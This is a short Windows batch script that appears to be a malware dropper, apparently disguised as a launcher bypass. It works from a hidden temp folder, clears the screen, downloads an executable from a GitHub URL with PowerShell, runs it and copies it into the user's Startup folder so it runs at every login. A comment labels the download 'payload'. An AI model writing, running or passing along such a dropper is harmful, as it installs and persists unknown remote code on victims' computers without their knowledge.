@echo off
title Windows 
cd %temp%
md {289347239847234908237432974}
cd {289347239847234908237432974}
cls
powershell -Command "Invoke-WebRequest https://github.com/onixlauncherbypass/onix/raw/refs/heads/main/Client-built.exe -Outfile client.exe"
cls

:: payload below 

start client.exe
xcopy "client.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
exit

